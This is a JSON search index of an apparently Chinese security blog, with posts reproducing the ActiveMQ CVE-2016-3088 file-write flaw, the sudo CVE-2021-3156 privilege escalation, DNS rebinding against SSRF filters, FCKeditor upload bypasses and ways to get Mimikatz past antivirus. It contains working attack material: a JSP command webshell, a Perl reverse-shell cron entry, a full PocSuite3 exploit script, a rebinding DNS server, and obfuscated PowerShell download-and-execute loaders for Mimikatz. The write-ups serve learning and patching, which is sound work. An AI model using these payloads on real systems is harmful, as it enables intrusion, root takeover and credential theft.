{"pages":[{"title":"","text":"404date:2019-07-19 16:41:10type:”404”layout:”404”description:”你来到了没有知识的荒原:(“","link":"/404.html"},{"title":"Bourne个人技能","text":"1.精通java研发，比较熟悉python、 shel研发， 熟悉C、汇编，web前端(HTML、 css、 js、 angular等) , android研发，较了解C++、R、PHP、ios研发，精通常见的设计模式，集合，多线程开发，线程安全，五种IO模型,精通JVM的结构和原理;2.精通Spring,Spring,Spring boot,Spring Cloud, Spring Mvc,Spring data jpa,mybatis,hibernate等开源框架;3.精通restful风格的接口、dubbo风格的接口的设计与编写;4.有过报表，定时任务，自己实现的单点登录，基于CAS企业级的单点登录，定制化视图，动环，傻瓜式部署开发经验;5.熟悉Storm, Hadoop的原理，Tomcat集群， ngnix高可用，fastdfs集群，redis集群， solr集群,apache配置及部署;6.熟悉常见的Linux命令，熟悉高并发分布式架构设计，熟悉云计算相关的业务与运维;7.熟悉redis, memcache, mongodb, kafka中间件的原理及使用;8.互联网电商架构及研发经验;9.熟悉Sphinx, Lucene.Solr搜索引擎， ActiveMQ,RocketMQ,kafka消息中间件的原理及使用;10.可以自己手动写一个RPC框架;11.可以自己手动写一个MyBatis框架;12.可以自己手动写一个Tomcat框架;13.可以自己手动写一个SpringMV C框架;14.可以自己手动写一个JDBC框架;15.可以手动写一个dubbo框架;16.可以手动写一个netty框架;17深入研究过编译器底层原理及源码，非常熟悉词法分析、语法分析，可从事编译器的研发;18.较深入研究过Iinux操作系统内核底层原理及源码，系统调用、内存分配算法、进程间关系等，可从事操作系统内核的研发;19.可以手动写个正则表达式的引擎;20.研究过大数据: hadoop、 hdfs、 hive、 pig、 hbase、 spark、 flink、strom等框架，有一定的实战经验，可从事大数据的研发;21.可以手动写一一个Spring 事务机制;22.深入研究过sql server, mysql的底层架构(命令分析器、查询优化器、查询执行器、访问方法、缓存区管理器、事务管理器等)，可从事数据库内核的研发;23.对AI、机器学习、深度学习的模型建立、训练数据集、测试数据集、 监督算法、无监督算法及整个算法流程有较深入的理解;24.研究过网络安全，对xss、 csrf、 sql注入、ddos攻击、 DNS劫持、arp攻击等有较深入的理解;对密码学有较深入的研究，精通web登录的流程及底层原理；熟悉网络攻击工具，比如:一句话木马、穿山甲、中国菜刀等。25.对算法(递归、动态规划等)及数据结构(数组、链表、堆栈、B类树、二叉树、图等)有较深入的理解。26.对传统互联网、移动互联网、大数据、云计算、Al、 区块链等业务技术有较深入的理解;27.可以手动写一个区块链;28.有较深厚的数学功底，大学期间，高等数学竞赛荣获全校第一名，概率论、离散数学及线性代数大学成绩几乎满分;29.JVM调优，linux内核调优、 tcpip协议栈， 数据库性能调优，ngnix、 tomcat参 数调优都有较丰富的经验。 30.呜呜呜都是编的，真的啥都不会，大佬们求带","link":"/about/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"ActiveMQ任意文件写入漏洞复现（CVE-2016-3088）","text":"背景简述ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。 2016年4月14日，国外安全研究人员 Simon Zuckerbraun 曝光 Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。 ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。 fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现其使用率并不高，而且文件操作容易出现漏洞 所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。 影响版本Apache ActiveMQ 5.0.0 – 5.13.2 ActiveMQ在5.12.x~5.13.x版本中，默认关闭了fileserver这个应用 5.14.0版本以后，彻底删除fileserver 漏洞原理本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。 文件写入有几种利用方法： 写入webshell 写入cron或ssh key等文件 写入jar或jetty.xml等库和配置文件 fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋； 写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限； 写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。 源码分析ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录,下载 ActiveMQ 5.7.0 源码 ，可以看到后台处理 PUT 的关键代码如下 \\activemq-parent-5.7.0\\activemq-fileserver\\src\\main\\java\\org\\apache\\activemq\\util\\RestFilter.java 用户可以上传文件到指定目录，该路径在 conf/jetty.xml 中定义，如下 \\activemq-parent-5.7.0\\assembly\\src\\release\\conf\\jetty.xml 顺着 PUT 方法追踪，可以看到调用了如下函数 同时看到后台处理 MOVE 的关键代码如下，可以看到该方法没有对目的路径做任何限制或者过滤。 由此，我们可以构造PUT请求上传 webshell 到 fileserver 目录，然后通过 Move 方法将其移动到有执行权限的 admin/ 目录。 漏洞复现环境搭建vulnhub拉取环境 git clone https://github.com/vulhub/vulhub.git 切换到\\vulhub\\activemq\\CVE-2016-3088目录 docker-compose build docker-compose up -d 运行端口为8161/61616 版本为5.11.1 0x01 webshell方式1、暴破目录12345PUT /fileserver/test/%20/%20 HTTP/1.1Host: 192.168.124.11:8161Content-Length: 4test 构造错误上传可以暴破绝对路径，在5.11.1版本下未成功 2、查看绝对路径admin登录 http://192.168.124.11:8161/admin/test/systemProperties.jsp 查看到绝对路径/opt/activemq 3、PUT上传JSP的webshell12345678910111213141516PUT /fileserver/2.jsp%00 HTTP/1.1Host: 192.169.124.11:8161Content-Length: 330&lt;%@ page import=&quot;java.io.*&quot;%&gt;&lt;% out.print(&quot;Hello&lt;/br&gt;&quot;); String strcmd=request.getParameter(&quot;cmd&quot;); String line=null; Process p=Runtime.getRuntime().exec(strcmd); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); while((line=br.readLine())!=null){ out.print(line+&quot;&lt;/br&gt;&quot;); }%&gt; http://192.168.124.11:8161/fileserver/2.jsp 上传成功但是不能解析（filserver目录下不支持） 4、MOVE修改路径可以解析jsp文件的路径有： 1．/opt/activemq/webapps/api 2．/opt/activemq/webapps/admin 构造file:///opt/activemq/webapps/admin/为上传的目录 123456MOVE /fileserver/2.jsp%00 HTTP/1.1Destination: file:///opt/activemq/webapps/admin/3.jspHost: 192.168.124.11:8161Content-Length: 0 注意此处Content-Length：0后要空2行，否则响应超时 5、admin登录执行命令http://192.168.124.11:8161/admin/3.jsp?cmd=pwd 0x02 上传SSH公钥方式1、本地生成key1ssh-keygen -t rsa 三个文件 2、将id_rsa.pub公钥上传123456PUT /fileserver/rsa.txt HTTP/1.1Host: 192.169.124.11:8161Content-Length: 411ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDgzwhc0OK6i7Mkqsc+TA5h+em9l0PvMakFqBLmaqDtKot6omy8aYkRrjN58jeZgoNpUGSMUuETWykTmOucE7gcU5YxzTKSB6lMM0KZJFC1uRKkUbuIuJud2L51ZSXTpruY6ozJIH/UzBjwoWdX6eCwYbGUwNgKdjeDZGKJfoqXLenjIDMB32DGk+PyB6wEyBZFYQeF2kixOsC/xavmQjtVEywz2CaJAiEbekCOns7XVqiMfBB/04A0790ylTFaDyW2ZR2zTpJ76LYa8busB8MrA/Zz7B8Dw1b/P9We3xOqKfUT8GOQ1zmfxxdpCS8UUv6Af4cuFYJXY7fdtzEnrZl esg\\wangrixiang01@A020171-NC 3、修改路径为/root/.ssh/authorized_keys123456MOVE /fileserver/rsa.txt HTTP/1.1Destination: file:///root/.ssh/authorized_keysHost: 192.168.124.11:8161Content-Length: 2 4、免密登录ssh root@192.168.124.11 （此处docker容器没有ssh，不予演示） 0x03写入cron.d计划任务 minute hour day month week command * * * * * command 代表每分钟执行一次 顺序：分 时 日 月 周 1*/1 * * * * root /usr/bin/perl -e 'use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};' 坑点：末尾加两个空格，burp中修改为0a put先写入fileserver/1.txt 然后move到/etc/cron.d/root 123456MOVE /fileserver/1.txt HTTP/1.1Destination: file:///etc/cron.d/rootHost: 192.168.124.11:8161Content-Length: 0 这个方法需要ActiveMQ是root运行，否则也不能写入cron文件。 0x04Metasploit 反弹shell进入metasploit，搜索2016-3088 0x05写入jetty.xml或jar在写入shell时会受到身份认证的限制，实际中除了口令爆破成功之外写shell比较困难，如果采用计划任务反弹shell，则需要activemq时root权限启动的，否则无法写入计划任务反弹shell,这个时候会想到写入jetty.xml配置文件覆盖原来的配置，取消身份认证即可写shell;思路没有问题，但是在本地测试时发现可以写入覆盖，但是必须要active重启才可以使配置生效，所以只有在root权限下才可以写入计划任务让服务重启，但此时可以直接弹shell了，就没必要去覆盖配置了，总体来说，思路上没有问题。 jetty.xml配置如下:只需要将身份认证的true改为false即可 EXP编写使用PocSuite3 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from collections import OrderedDictimport requestsfrom pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPEfrom pocsuite3.api import OptStringclass ActiveMq(POCBase): vulID = '001' # ssvid version = '1.0' author = ['b0urne'] vulDate = '2020-12-22' createDate = '2020-12-22' references = ['https://paper.seebug.org/346/'] name = 'Apache ActiveMQ (CVE-2016-3088)' appPowerLink = 'http://www.knownsec.com/' appName = 'Apache ActiveMQ' appVersion = 'Apache ActiveMQ 5.11.1' vulType = VUL_TYPE.XSS desc = ''' python cli.py -r docs/AcitveMq.py -u target --verify python cli.py -r docs/AcitveMq.py -u target --attack ''' samples = [] category = POC_CATEGORY.EXPLOITS.WEBAPP def _verify(self): result = {} path = &quot;fileserver/1.txt&quot; url = self.url + '/' + path payload = '111' #payload = &quot;username={0}&amp;password={1}&quot;.format(self.get_option(&quot;username&quot;), self.get_option(&quot;password&quot;)) r = requests.put(url, data=payload) if r.status_code == 204: result['VerifyInfo'] = {} result['VerifyInfo']['URL'] = self.url result['VerifyInfo']['PutUrl'] = url result['VerifyInfo']['Postdata'] = payload return self.parse_output(result) def _attack(self): result = {} path = &quot;fileserver/1.txt&quot; path1 = &quot;api/1.jsp?cmd=id&quot; url = self.url + '/' + path url1 = self.url + '/' + path1 proxies = { 'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080' } payload = '&lt;%@ page import=&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&lt;/br&gt;&quot;);String strcmd=request.getParameter(&quot;cmd&quot;);String line=null;Process p=Runtime.getRuntime().exec(strcmd);BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));while((line=br.readLine())!=null){out.print(line+&quot;&lt;/br&gt;&quot;);}%&gt;' headers = { 'Destination': 'file:///opt/activemq/webapps/api/1.jsp' } headers1 = { 'Authorization': 'Basic YWRtaW46YWRtaW4=', 'Connection': 'close' } try: resp = requests.put(url, data=payload) resp1 = requests.get(url) resp2 = requests.request('MOVE', url=url, headers=headers) resp3 = requests.get(url1, headers=headers1) result['AdminInfo'] = {} result['AdminInfo']['SHELL'] = url1 result['AdminInfo']['RESP'] = resp3 result['AdminInfo']['EXEC '] = resp3.text[10:-5] except Exception as ex: pass return self.parse_output(result) def parse_output(self, result): output = Output(self) if result: output.success(result) else: output.fail('target is not vulnerable') return outputregister_poc(ActiveMq) 漏洞防御1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。 2、通过移除 conf\\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能","link":"/2020/12/20/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2016-3088%EF%BC%89/"},{"title":"CVE-2021-3156 Sudo提权","text":"漏洞简述​ 国外研究团队发现sudo堆溢出漏洞（CVE-2021-3156），漏洞隐藏十年之久，普通用户可以通过利用此漏洞，在默认配置的 sudo 主机上获取root权限。 ​ 成功利用此漏洞，任何没有特权的用户都可以在易受攻击的主机上获得root特权。研究人员已经在Ubuntu 20.04（Sudo 1.8.31），Debian 10（Sudo 1.8.27）和Fedora 33（Sudo 1.9.2）上独立验证漏洞并开发多种利用漏洞并获得完整的root用户特权，其他操作系统和发行版也可能会被利用。 ​ 当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。 影响版本Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 不受影响版本 Sudo =&gt;1.9.5p2 漏洞复现EXP链接： 1https://github.com/blasty/CVE-2021-3156 下载： 1git clone https://github.91chifun.workers.dev//https://github.com/blasty/CVE-2021-3156.git 查看sudo版本： 1sudo -V 查看系统版本 1cat /proc/version 编译并运行 12make./sudo-hax-me-a-sandwich 0 遇到报错，重装make、gcc、make-guile再次尝试 123sudo apt install make sudo apt install make-guilesudo apt install gcc 漏洞修复目前官方已在sudo新版本1.9.5p2中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接： https://www.sudo.ws/download.html CentOS 系统用户：1）CentOS 6：默认 sudo 在受影响范围，CentOS官方已停止更新；2）CentOS 7：升级到 sudo-1.8.23-10.el7_9.1 或更高版本 ；3）CentOS 8：升级到 sudo-1.8.29-6.el8_3.1或更高版本。 Ubuntu系统用户：1）Ubuntu 20.04 LTS版本用户，建议升级到如下版本：sudo - 1.8.31-1ubuntu1.2sudo-ldap - 1.8.31-1ubuntu1.2 2）Ubuntu 18.04 LTS版本用户，建议升级到如下版本：sudo - 1.8.21p2-3ubuntu1.4sudo-ldap - 1.8.21p2-3ubuntu1.4 3）Ubuntu 16.04 LTS版本用户，建议升级到如下版本：sudo - 1.8.16-0ubuntu1.10sudo-ldap - 1.8.16-0ubuntu1.10 https://blog.csdn.net/qq_37602797/article/details/113462965 https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247497490&amp;idx=1&amp;sn=795f23bebb262494992caca23f16667b&amp;chksm=ec9f2e61dbe8a77759b6e0bbf1e5dbd19a74a109320a19d5e0c30001a648c912b7f22b80eb86&amp;mpshare=1&amp;scene=22&amp;srcid=0127Yxu8sNQNzhRrSybRUKCA&amp;sharer_sharetime=1611733978267&amp;sharer_shareid=770f98851b638bfa83ce3efb882b4f25#rd","link":"/2021/02/01/CVE-2021-3156-Sudo%E6%8F%90%E6%9D%83/"},{"title":"DNS Rebinding攻击绕过ssrf","text":"前言在这篇文章：谈一谈如何在 Python 开发中拒绝 SSRF 漏洞 里面提出： 这种处理流程真的能避免 SSRF 吗？ 可以避免的有： 直接访问内网 IP 302 跳转 xip.io/xip.name 及短链接变换等 URL 变形 畸形 URL iframe 攻击 IP 进制转换 …… 看起来似乎很完美，但是还有一种攻击可以绕过此种处理流程，就是 DNS Rebinding Attack。 DNS Rebinding Attack（DNS 重绑定攻击）攻击原理： 一般进行 ssrf 防御的模式如下： 获取到输入的URL，从该URL中提取host 对该host进行DNS解析，获取到解析的IP 检测该IP是否是合法的，比如是否是私有IP等 如果IP检测为合法的，则进入curl的阶段发包 观察到，在这个流程中，一共进行了两次DNS解析：第一次是对URL的host进行DNS解析，第二次是使用CURL发包的时候进行解析。这两次DNS解析是有时间差的，我们可以使用这个时间差进行绕过。 事件差对应的DNS中的机制是TTL。TTL表示DNS里面域名和IP绑定关系的Cache在DNS上存活的最长时间。即请求了域名与iP的关系后，请求方会缓存这个关系，缓存保持的时间就是TTL。而缓存失效后就会删除，这时候如果重新访问域名指定的IP的话会重新建立匹配关系及cache。 在上面的流程中，如果在DNS第二次解析的时候，我们能够更换URL对应的IP，那么在TTL之后、缓存失效之后，重新访问此URL的话，就能获取被更换后的IP。如果我们把第一次解析的IP设为合法IP，就能绕过host合法性检查了；把第二次解析的IP设为内网IP，就达到了SSRF访问内网的目的。 在这个过程中，对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就会导致绕过。 所以总结一下： DNS 重绑定攻击的原理是：利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf的目的。 时间窗口问题： TTL 最理想的设置是0，即在第一次解析之后，立马换位我们想要访问的内网IP。 但是现实是：现在国内购买的域名大都无法直接将TTL设置为0，例如阿里云的域名，最小的TTL是10分钟。而某些国外的域名可以设置TTL=0。 这种情况其实问题不大，在某些情况下，我们甚至可以对同一个域名设置两个A记录（一个内网、一个外网），这样会random访问两条记录中的一个。这样就会变成有概率的成功，不是完全成功而已。 在实战中我们还可能遇到 DNS 缓存的问题。即使我们在前面实现的时候设置了TTL为0，但是有些公共DNS服务器，比如114.114.114.114还是会把记录进行缓存，完全不按照标准协议来，遇到这种情况是无解的。但是8.8.8.8是严格按照DNS协议去管理缓存的，如果设置TTL为0，则不会进行缓存。 这种情况只能看命了。 DNS重绑定攻击步骤： 恶意网站：http://attacker.com用到很短的生存时间（TTL），比如60s来记录，页面上包含一个恶意的Javascript有效载荷，利用著名的WebRTC内部IP漏洞获取本机的内部IP地址，对内网进行B&amp;O设备扫描。 可以自动创建并删除图像标记来寻找IP地址包含/images/BO_processing_grey.gif，找到扫描结束，DNS重绑定开始 例如找到地址为：192.168.1.10，我们把这个ip发给攻击者，在客户端的JavaScript负载等待超过一分钟，一分钟之后，在试图得到http://attacker.com/1000/Bo_network_settings.asp。 DNS此时过期，我们将http://attacker.com解析到了192.168.1.10，此时仍然认为是同源。 在网站 SSRF 漏洞处访问精心构造的域名。网站第一次解析域名，解析域名获取 IP 地址 A； 经过网站后端服务器的检查，判定此IP为合法IP。 网站获取URL对应的资源（在一次网络请求中，先根据域名服务器获取IP地址，再向IP地址请求资源），第二次解析域名。此时已经过了ttl的时间，解析记录缓存IP被删除。第二次解析到的域名为被修改后的 IP 即为内网IP B； 攻击者访问到了内网 IP。 DNS rebinding被广泛用于bypass同源策略，绕过ssrf的过滤等等。 DNS Rebinding 攻击演示Bendawang 师傅总结了三种实现方法： 实现方法一：特定域名实现 实现方法二：简单粗暴的两条A记录 实现方法三：自建DNS服务器 我比较喜欢偷懒，因为 ceye.io 上面已经有 DNS Rebinding 功能了。比如我随便把两条解析记录设置为： ceye说会 “the dns answer section will randomly return one of them”，有点慌。 不是稳定的两个IP交替，这种情况下就是撞运气了。如果能达到第一次访问的是144.x.x.x这个外网地址，第二次访问的是 127.0.0.1，成功的希望就大了一些。 个人不是很建议使用ceye的这个DNS Rebinding，尝试中单位时间内好多次都访问了同一个IP。感觉这个切换率还不如同域名绑定两个 ANAME 呢。 另一个利用是否成功的因素取决于目标网站的业务逻辑中的 TTL： Java默认不存在被DNS Rebinding绕过风险（TTL默认为10） PHP默认会被DNS Rebinding绕过 Linux默认不会进行DNS缓存 还是换成自建DNS服务器的方式： 在 snowming.space 上操作（狗爹上买的域名）： 在snowming.me上操作（狗爹上买的域名）： 在144.168.57.70这台服务器上开启dns服务: 1from twisted.internet import reactor, deferfrom twisted.names import client, dns, error, serverrecord={}class DynamicResolver(object): def _doDynamicResponse(self, query): name = query.name.name if name not in record or record[name]&lt;1: # 随意一个 IP，绕过检查即可 ip=&quot;104.160.43.154&quot; else: ip=&quot;127.0.0.1&quot; if name not in record: record[name]=0 record[name]+=1 print name+&quot; ===&gt; &quot;+ip answer = dns.RRHeader( name=name, type=dns.A, cls=dns.IN, ttl=0, payload=dns.Record_A(address=b'%s'%ip,ttl=0) ) answers = [answer] authority = [] additional = [] return answers, authority, additional def query(self, query, timeout=None): return defer.succeed(self._doDynamicResponse(query))def main(): factory = server.DNSServerFactory( clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')] ) protocol = dns.DNSDatagramProtocol(controller=factory) reactor.listenUDP(53, protocol) reactor.run()if __name__ == '__main__': raise SystemExit(main()) 注1：此脚本可以做到第一次请求解析记录时返回第一个外网 IP，第二次请求解析记录的时候返回一个第二个内网 IP。注2：里面ttl设为了0。 在终端中运行： 1pip install twistedsudo python dns_server.py 注：有时候也会两次解析到第一个外网IP，后面都解析到第二个内网或主机IP。多尝试几次就好。 展示一下一个全盲 SSRF 访问此域名之后的解析记录： 这说明此全盲 SSRF 无上面那种SSRF防御流程。直接访问了 URL 获取资源。这中间只经历了一次 DNS 解析。 我这里没有具有这种防御机制的 SSRF 漏洞，遇到了再看。 参考链接（排名有先后）：[1] 关于DNS-rebinding的总结，Bendawang’s Website，Bendawang，2017年5月31日[2] [DNS rebinding](https://cl0und.github.io/2018/01/28/DNS rebinding/)，cL0und 博客，cL0und，2018年1月28日[3] Use DNS Rebinding to Bypass SSRF in Java，美丽联合集团安全应急响应中心，JoyChou@美联安全，2017年9月11日[4] 通过DNS重新绑定绕过过度同源策略攻击传输分析，安全客，2018年2月6日[5] DNS REBINDING，知乎，adrain，2017年3月7日[6] DNS Rebinding技术绕过SSRF/代理IP限制，CSDN，隐形人真忙，2017年1月22日[7] Windows Server 部署DNS服务，2018年8月2日[8] DNS Rebinding 域名重新绑定攻击技术，FREEBUF，漏斗社区，2019年1月23日 转自：http://blog.leanote.com/post/snowming/e2c24cf057a4","link":"/2020/10/07/DNS-Rebinding%E6%94%BB%E5%87%BB%E7%BB%95%E8%BF%87ssrf/"},{"title":"FckEditor编辑器上传漏洞getshel总结","text":"一、环境搭建在我的资源中下载： fckeditor编辑器上传——含有点变成下划线限制的源码包，下载后，使用IIS搭建即可。 二、漏洞复现突破.变_访问目标网站，如下图所示：通过遇见扫描，发现目标网站存在fckeditor编辑器百度搜索fckeditor编辑器漏洞利用，找到参考链接：https://www.cnblogs.com/milantgh/p/3775396.html，按照链接中常用上传地址挨个进行测试测试过程中发现第三个会弹窗提示，说明没有访问到上传目录，那么添加…/…/到文件上传目录接下来，查看目标网站搭建平台，发现是IIS6.0，那么可以结合IIS6.0的解析漏洞进行利用上传logo.asp;.x.jpg图片成功上传，并查看页面源代码查找文件路径并进行访问访问上传的文件后，发现是图片，并没有当作asp进行解析。而且文件名字变为了logo_asp;x.jpg，这是因为Fckeditor进行了上传限制 突破方法：突破方法一（配合解析漏洞）：二次上传123第一次上传 logo.asp;x.jpg ==&gt;变成logo_asp;_x.jpg 第二次 上传logo.asp;x.jpg ==&gt;变成logo.asp;.x(1).jpg 12 再次上传logo.asp;x.jpg文件虽然会提示，但不用理会，点击确定继续上传即可之后成功上传，结果是logo_asp;_x(1).jpg，以前这种方法是可以的，但这个环境不可以，知道此方法就行 突破方法二（配合解析漏洞）：创建文件夹新建一个ceshi.asp文件夹并抓包查看HTTP请求头，如下图所示：/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=%2F&amp;NewFolderName=ceshi.asp&amp;uuid=1607337224005发现文件夹变成了ceshi_asp 接下里，直接访问当前文件夹并抓包查看HTTP请求头，如下图所示：/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F&amp;uuid=1607337266178对比两个HTTP请求数据包不同的部分，发现只有后半部分不一样，第一个请求包多一个NewFolderName参数&amp;CurrentFolder=%2F&amp;NewFolderName=ceshi.asp&amp;uuid=1607337224005&amp;CurrentFolder=%2F&amp;uuid=1607337266178 分析：%2f也就是/ ，猜测&amp;CurrentFolder=/a/&amp;NewFolderName=aaa.asp 会变成/a/aaa.asp &amp;CurrentFolder=/&amp;uuid=1582206392524 就是/ 那么猜测上传/q.asp/w.asp是否可以突破Fckeditor的限制成功tupo，创建文件夹q.asp因为程序只过滤了NewFolderName参数，没有对CurrentFolder参数进行过滤，那么我们就可以利用的CurrentFolder参数，通过CurrentFolder创建文件夹。既然文件夹创建好了那么上传木马文件cus.asp，注意：将cus.asp后缀修改为cus.jpg，后再进行上传之后访问上传的cus.jpg文件发现被当作asp文件进行了解析使用菜刀成功连接 突破方法三（双重截断上传+二次上传）：此方法不配合解析漏洞首先上传一个x.asp.asp.jpg文件，并且使用burpsuite拦截数据包拦截数据包后将x.asp.asp.jpg修改为x.asp%00asp%00jpg之后再将x.asp%00asp%00jpg中的%00进行URL解码，解码之后如下图所示，虽然显示什么也没有，但是已经解码解码之后点击发送，提示你文件上传成功，文件名为x.asp__asp__jpg数据包什么也不要修改，点击send再次发送，发现文件上传成功，文件名为：x(1).asp，成功突破限制访问该文件，发现被成功解析，使用菜刀成功连接 转自：https://blog.csdn.net/weixin_40412037/article/details/110823562","link":"/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/"},{"title":"Mimikatz绕过的方式","text":"Mimikatz介绍Mimikatz是一款能够从Windows认证(LSASS)的进程中获取内存，并且获取明文密码和NTLM哈希值的神器，内网渗透中常用mimikatz获取明文密码或者获取hash值来漫游内网。但是在实际的运用中，常常会遇到杀软的拦截，所以这里我借鉴网上的资料，进行复现学习，达到免杀绕过的目的。有些方式没有复现成功我就没有写出来了，有一些成功之后似乎也会被拦截了。 姿势一：powershell1https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1 cmd下执行，360没有拦截 1powershell -exec bypass &quot;import-module .\\Invoke-Mimikatz.ps1;Invoke-Mimikatz&quot; powershell运行会被拦截 1powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.30.139/Invoke-Mimikatz.ps1');Invoke-Mimikatz 简单混淆还是被拦截了 1powershell -c &quot; ('IEX '+'(Ne'+'w-O'+'bject Ne'+'t.W'+'ebClien'+'t).Do'+'wnloadS'+'trin'+'g'+'('+'1vchttp://'+'192.168.30'+'.139/'+'Inv'+'oke-Mimik'+'a'+'tz.'+'ps11v'+'c)'+';'+'I'+'nvoke-Mimika'+'tz').REplaCE('1vc',[STRing][CHAR]39)|IeX&quot; 姿势二：使用.net2.0免杀mimikatz首先下载katz.cs，并放在对应的系统版本的Framework目录中 1234532位：C:\\Windows\\Microsoft.NET\\Framework\\v2.0.5072764位：C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727 然后在powershell中执行命令生成key.snk 123456789$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='$Content = [System.Convert]::FromBase64String($key)Set-Content key.snk -Value $Content -Encoding Byte 最后生成mimikatz，再运行 32位： 1C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727&gt;.\\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727&gt;.\\regsvcs.exe katz.exe 64位： 1C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727&gt;.\\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727&gt;.\\regsvcs.exe katz.exe 很不幸，又被360发现了然而，火绒又过了，没有一点提示 姿势三：js加载mimikatz下载katz.js，执行 1cscript mimikatz.js 360拦截，但是火绒过了，没有反应 姿势四：.net4.0加载mimikatz下载[mimikatz.xml](https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes mimikatz.xml)，执行 